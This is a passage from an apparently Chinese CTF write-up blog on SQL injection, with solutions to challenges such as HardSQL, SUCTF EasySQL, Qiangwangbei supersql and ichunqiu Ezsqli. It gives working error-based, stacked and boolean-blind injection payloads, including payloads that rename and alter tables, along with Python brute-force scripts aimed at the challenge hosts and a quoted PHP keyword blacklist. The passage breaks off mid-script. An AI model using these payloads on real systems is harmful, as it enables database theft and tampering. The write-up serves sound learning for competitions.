punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span>'<span class="token number">22</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/OVRLtoYlm12nI4i.png" alt="" loading="lazy"></p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="极客大挑战—HardSQL"><a href="#极客大挑战—HardSQL" class="headerlink" title="极客大挑战—HardSQL"></a>极客大挑战—HardSQL</h3><p><strong>解题核心</strong>—————–报错注入，异或(^)注入，like绕过，左右拼接</p><p>经过测试发现过滤了：空格，=，order by，union，and</p><p>用^异或操作代替union，用updatexml()或extractvalue()报错注入，以下均使用extractvalue()函数</p><p>查库：</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span>'<span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#查当前数据库</span></code></pre><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span>'<span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span>schemata<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#查所有数据库</span></code></pre><p>这里为什么没有显示当前geek数据库有点纳闷，可能是这个查询屏蔽了geek数据库</p><p>查表（like代替=进行查询）：</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span><span class="token string">'^extractvalue(1,concat(1,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like'</span>geek'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#查geek数据库下的表</span></code></pre><p>查列：</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span><span class="token string">'^extractvalue(1,concat(1,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like'</span>H4rDsq1'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#</span></code></pre><p>查字段（限制了显示的字符串数，利用left()，right()查询）：</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span>'<span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span><span class="token keyword">left</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>H4rDsq1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#查左边</span><span class="token number">1</span>'<span class="token operator">^</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token punctuation">(</span><span class="token keyword">right</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>H4rDsq1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#查右边</span></code></pre><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><h3 id="2020ichunqiu新春公益赛—blacklist"><a href="#2020ichunqiu新春公益赛—blacklist" class="headerlink" title="2020ichunqiu新春公益赛—blacklist"></a>2020ichunqiu新春公益赛—blacklist</h3><p>这个题目可参考  [强网杯 2019]supersql</p><p>不过这题过滤的东西要多一些，常用的两种方法：</p><blockquote><p>预编译注入绕过关键词：set、prepare</p><p>改表名使flag所在的数据库变为题目查询的数据库：rename 、alter </p></blockquote><p>都被过滤用不了了</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/Juin3SGqkeVxfpX.png" alt="" loading="lazy"></p><p>这里就用到了mysq的新特性<code>handler</code>，<a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html" target="_blank" rel="noopener">详</a></p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">handler</span> FlagHere <span class="token keyword">open</span> <span class="token keyword">as</span> cool<span class="token punctuation">;</span><span class="token keyword">handler</span> cool <span class="token keyword">read</span> <span class="token keyword">first</span><span class="token punctuation">;</span><span class="token keyword">handler</span> cool <span class="token keyword">read</span> <span class="token keyword">next</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">#</span></code></pre><p>通过以上语句可以得到flag，（比赛的时候没做出来，赛后没来得及看这题，早在一个多月前学长在群里发过这个新特性，当时太菜看不懂，现在想想可惜了 -.-）</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/7bxJWosa2PNCnRg.png" alt="" loading="lazy"></p><h3 id="2019SUCTF—EasySQL"><a href="#2019SUCTF—EasySQL" class="headerlink" title="2019SUCTF—EasySQL"></a>2019SUCTF—EasySQL</h3><p><strong>解题核心</strong>：</p><ul><li>堆叠注入</li><li>*的使用</li><li>sql_mode 的应用</li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/UyvVse24JRKQZFY.png" alt="" loading="lazy"></p><p>听说比赛的时候泄露了源码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include_once</span> <span class="token string">"config.php"</span><span class="token punctuation">;</span>    <span class="token variable">$post</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$get</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">global</span> <span class="token variable">$MysqlLink</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//GetPara();</span>    <span class="token variable">$MysqlLink</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token variable">$datauser</span><span class="token punctuation">,</span><span class="token variable">$datapass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$MysqlLink</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Mysql Connect Error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$selectDB</span> <span class="token operator">=</span> <span class="token function">mysqli_select_db</span><span class="token punctuation">(</span><span class="token variable">$MysqlLink</span><span class="token punctuation">,</span><span class="token variable">$dataName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$selectDB</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Choose Database Error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$post</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//die();</span>    <span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">></span></span></span> Give me your flag<span class="token punctuation">,</span> I will tell you <span class="token keyword">if</span> the flag is right<span class="token punctuation">.</span> <span class="token markup">&lt;/ a></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>query<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$BlackList</span> <span class="token operator">=</span> <span class="token string">"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\""</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//var_dump(preg_match("/{$BlackList}/is",$post['query']));</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/{$BlackList}/is"</span><span class="token punctuation">,</span><span class="token variable">$post</span><span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//echo $post['query'];</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Nonono."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Too long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select "</span><span class="token punctuation">.</span><span class="token variable">$post</span><span class="token punctuation">[</span><span class="token string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"||flag from Flag"</span><span class="token punctuation">;</span>        <span class="token function">mysqli_multi_query</span><span class="token punctuation">(</span><span class="token variable">$MysqlLink</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">do</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">mysqli_store_result</span><span class="token punctuation">(</span><span class="token variable">$MysqlLink</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_row</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token keyword">while</span><span class="token punctuation">(</span>@<span class="token function">mysqli_next_result</span><span class="token punctuation">(</span><span class="token variable">$MysqlLink</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token delimiter">?></span></code></pre><p>mysqli_multi_query()  函数执行一个或多个针对数据库的查询。多个查询用分号进行分隔。有这个函数即可想到利用堆叠注入</p><p>sql_mode 是一组mysql支持的基本语法及校验规则</p><p><strong>mysql中sql_mode值举例：</strong> </p><p><strong>STRICT_TRANS_TABLES：</strong> </p><blockquote><p>mysql存储引擎的概念<br>innodb存储引擎（oltp系统）<br>myisam存储引擎（非实时交易）<br>对于innodb存储引擎来说当设置sql_mode有该值是，当发现插入数据无法正常插入，会报错，并且回滚所有参数（加入一个插入操作往数据表中插入10行数据，但是在第五行数据不能插入，此时会终止插入操作并且会回滚插入成功的数据）<br>对于myisam存储引擎：当插入数据是第一行无法插入时，报错并且回滚插入数据当插入的数据不是第一行无法插入时，此时mysql数据库会将无法插入的值转换为近似值或者发生隐式类型转换，并且不会报错 </p></blockquote><p><strong>STRICT_ALL_TABLES：</strong> </p><blockquote><p>对于innodb存储引擎作用一致<br>对于myisam存储引擎：当插入不是第一行报错时，会将报错之前的数据保留，终止之后的插入操作 </p></blockquote><p><strong>NO_ENGINE_SUBSTITUTION：</strong> </p><blockquote><p>当存储引擎被禁止或者未解析时，当使用时会报错 </p></blockquote><p><strong>only_for_group_by：</strong> </p><blockquote><p>当select字句中出现的单独列没有出现在group by字句中，此时就会报错 </p></blockquote><p><strong>NO_AUTO_CREATE_USER:</strong> </p><blockquote><p>禁止创建密码为空的用户 </p></blockquote><p><strong>NO_ZERO_IN_DATE：</strong> </p><blockquote><p>在严格模式下，不允许日期和月份为零 </p></blockquote><p><strong>NO_ZERO_DATE：</strong> </p><blockquote><p>设置该值，mysql数据库不允许插入零日期，插入零日期会抛出错误而不是警告 </p></blockquote><p><strong>ERROR_FOR_DIVISION_BY_ZERO：</strong> </p><blockquote><p>在INSERT或UPDATE过程中，如果数据被零除，则产生错误而非警告。如果未给出该模式，那么数据被零除时MySQL返回NULL </p></blockquote><p><strong>NO_AUTO_CREATE_USER：</strong> </p><blockquote><p>禁止GRANT语句创建密码为空的用户 </p></blockquote><p><strong>PIPES_AS_CONCAT：</strong> </p><blockquote><p>将“||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似（本题要点） </p></blockquote><p><strong>ANSI_QUOTES：</strong> </p><blockquote><p>启用ANSI_QUOTES后，不能用双引号来引用字符串，因为它被解释为识别符</p></blockquote><p>于是有注入语句：</p><pre class=" language-mssql"><code class="language-mssql">1;set sql_mode=PIPES_AS_CONCAT;SELECT 1</code></pre><p>拼合起来就是：</p><pre><code>select 1;set sql_mode=PIPES_AS_CONCAT;SELECT 1||flag from Flag</code></pre><p>此时的select 1||flag from Flag就等同于select 1 from Flag和select flag from Flag的拼合</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/e6sQR1uwh3UA9v5.png" alt="" loading="lazy"></p><p>另外还有一个解就是*的用法：</p><p>注入：</p><pre class=" language-mysql"><code class="language-mysql">*,1</code></pre><p>拼合起来就是：</p><pre class=" language-mysql"><code class="language-mysql">select *,1||flag from Flag</code></pre><p>*为查询所有，此时的select *,1||flag from Flag就等同于select * from Flag</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/xLgmrQAq4CXcp2G.png" alt="" loading="lazy"></p><h3 id="2019强网杯—supersql"><a href="#2019强网杯—supersql" class="headerlink" title="2019强网杯—supersql"></a>2019强网杯—supersql</h3><p><strong>解题核心</strong>——————堆叠注入；详见大佬博客：<a href="https://www.cnblogs.com/0nth3way/articles/7128189.html" target="_blank" rel="noopener">SQL注入-堆叠注入</a></p><p>由题意，得知这应该是一个sql注入的题目，点进去界面如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/Tdw4xkpqRJPmFQy.png" alt="" loading="lazy"></p><p>刚开始用SQLMap测试了一下，发现好像没啥用，于是按开F12</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/DBHQpKrU6AjybXo.png" alt="" loading="lazy"></p><p>嗯，确实，一个工具有啥灵魂O.O</p><p>测试单引号</p><pre class=" language-mysql"><code class="language-mysql">1'</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/5WiljO9kLTRwdqv.png" alt="" loading="lazy"></p><p>接着测试注释：</p><pre class=" language-mysql"><code class="language-mysql">1'--+</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/lDUIhJOMKngXdsa.png" alt="" loading="lazy"></p><p>被过滤掉了</p><pre class=" language-mysql"><code class="language-mysql">1'#</code></pre><p>#有效</p><p>尝试注入sql查询等语句，提示被过滤</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/2AlOtopcrP7UjBs.png" alt="" loading="lazy"></p><p>于是就用到前面提到了堆叠注入</p><p>首先列出所有数据库：</p><pre class=" language-mysql"><code class="language-mysql">1';show databases;#         显示如下</code></pre><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/fMxuDnZJ8HYsOvV.png" style="zoom:50%;" / loading="lazy"><p>列出所有表：</p><pre class=" language-mysql"><code class="language-mysql">1';show tables;#         显示如下</code></pre><img src="https://i.loli.net/2020/03/27/Sb8T1CNKvhA4snR.png" style="zoom:50%;" / loading="lazy"><p>列出表words中的所有列：</p><pre class=" language-mysql"><code class="language-mysql">1';show columns from words;#         显示如下</code></pre><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/pFizfkZX6QTS9mR.png" style="zoom:50%;" / loading="lazy"><p>列出表1919810931114514中所有的列：</p><pre class=" language-mysql"><code class="language-mysql">1';show columns from `1919810931114514`;#         显示如下</code></pre><p><strong>注意：字符串为表名操作时要加反引号！！！</strong></p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/kKmUczN6AZCnRwb.png" style="zoom:50%;" / loading="lazy"><p>由展示的结果发现输入查询的结果是一个数字和一个字符串，是表words中的id和data结构，服务器是把inject的数值赋给id来查询表words中的数据</p><p>这题没有禁用rename和alter</p><p>可采用修改表结构的方法来得到flag，将words表名改为words1，再将数字名表改为words，这样数字名表就是默认查询的表了，但是它少了一个id列，可以将flag字段改为id，或者添加id字段</p><blockquote><p>rename用来修改表名</p><p>用法rename命令格式：rename table 原表名 to 新表名;</p></blockquote><blockquote><p>alter用来删除，添加或修改表字段</p><p>常用的语法格式如下：ALTER TABLE &lt;表名&gt; [修改选项]</p></blockquote><pre class=" language-mysql"><code class="language-mysql">1';rename table `words` to `words1`;rename table `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100);#</code></pre><p>上段注入语句的意思是将表words的名字修改为words1，把包含flag表1919810931114514的名字改成words，这样就可以通过服务器查询表1919810931114514中的内容了，但是flag表中含有少一个id列，于是可以在表中添加一个后者将flag列改为id，上面用到的是改flag列名字为id的方法,下面给出添加id列的方法：</p><pre class=" language-mysql"><code class="language-mysql">1';rename table `words` to `words1`;rename table `1919810931114514` to `words`; alter table `words` add `id` varchar(100);#</code></pre><p>最终得到flag：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/UoGTZ8HB9c7KlQ3.png" alt="" loading="lazy"></p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h3 id="2020ichunqiu新春公益赛—Ezsqli"><a href="#2020ichunqiu新春公益赛—Ezsqli" class="headerlink" title="2020ichunqiu新春公益赛—Ezsqli"></a>2020ichunqiu新春公益赛—Ezsqli</h3><p>出题思路<a href="https://www.smi1e.top/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E7%9B%8A%E8%B5%9B-ezsqli-%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/" target="_blank" rel="noopener">Smi1e</a></p><p>界面：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/tQegj4JmCsGbTXp.png" style="zoom:50%;" / loading="lazy"><p>FUZZ测试后发现</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/7UIS3oMv6DWqsj8.png" style="zoom:80%;" / loading="lazy"><p><code>in</code>被过滤<code>information_schema</code>、<code>mysql.innodb_table_stats</code>、<code>sys.schema_auto_increment_columns</code>都用不了了，这时就需要新的表来代替，<a href="https://osandamalith.com/2020/01/27/alternatives-to-extract-tables-and-columns-from-mysql-and-mariadb/" target="_blank" rel="noopener">参考</a></p><p>Payload1：<code>1^((select substr((select group_concat(table_name) from sys.x$schema_flattened_keys),1,1))=&#39;f&#39;)</code></p><p>Payload2：<code>1^((select substr((select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer where table_schema=database()),1,1))=&#39;f&#39;)</code></p><p>于是写出盲注爆表脚本（Payload1）</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://586656b32259484e8dbc25a81ee0a407820801130961430a.changame.ichunqiu.com/index.php"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#d = "1 and if(ascii(mid(fl4g,1,1))regexp "+str(j)+",sleep(3),1)"</span>        d <span class="token operator">=</span> <span class="token string">"1^(ascii(substr((select group_concat(table_name,'') from sys.x$schema_flattened_keys),{},1))={})"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"id"</span><span class="token punctuation">:</span>d<span class="token punctuation">}</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data <span class="token operator">=</span> data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'Nu1L'</span> <span class="token operator">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><p>得到两个表名，<code>f1ag_1s_h3r3_hhhhh</code>、<code>users233333333333333</code></p><p><code>flag</code>应该在<code>f1ag_1s_h3r3_hhhhh</code>中，这里需要用到一个技巧，就是将查询语句与相同数量的列进行比较，<a href="https://nosec.org/home/detail/3830.html" target="_blank" rel="noopener">参考</a>，如图</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/sFLidjDgr5weSft.png" style="zoom: 80%;" / loading="lazy"><p>而在mysql中，比较字符串大小是按位比较的，所以就可以用比较大小的方法一个一个的得到字段的内容</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/JIK9gluR1khN6zr.png" style="zoom:80%;" / loading="lazy"><p>注：出题人这里还有一个坑，详见题目下方的链接</p><p>mysql默认是不区分大小写的区分大小写的注入，所以在爆字段的时候需要注意，但由于比赛flag都是小写，所以就直接盲注就可以了，但这里还是给出区分大小写的方法，<code>BINARY(&quot;A&quot;)</code>、<code>CAST(&quot;A&quot; AS JSON)</code>都会返回大写的A，当<code>in</code>被过滤了<code>BINARY</code>就不好使了，所以用第二个就OK</p><p>这里可以测试出有两个列，但是盲猜第一列的第一个是1可还行</p><p>Payload：<code>1^((select 1,concat(&#39;{}~&#39;,CAST(&#39;0&#39; AS JSON)))&lt;(select * from f1ag_1s_h3r3_hhhhh limit 1))</code></p><p>于是写出盲注爆字段脚本</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> stringurl <span class="token operator">=</span> <span class="token string">"http://a9362c1023c04da19c143e01d7991148619db7d8fbff4e43.changame.ichunqiu.com/index.php"</span>str <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"-"</span> <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>punctuation<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\\"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> str<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#d = "1 and if(ascii(mid(fl4g,1,1))regexp "+str(j)+",sleep(3),1)"</span>        d <span class="token operator">=</span> <span class="token string">"1^((select 1,concat('{}~',CAST('0' AS JSON)))&lt;(select * from f1ag_1s_h3r3_hhhhh limit 1))"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>flag<span class="token operator">+</span>j<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"id"</span><span class="token punctuation">:</span>d<span class="token punctuation">}</span>        r <span 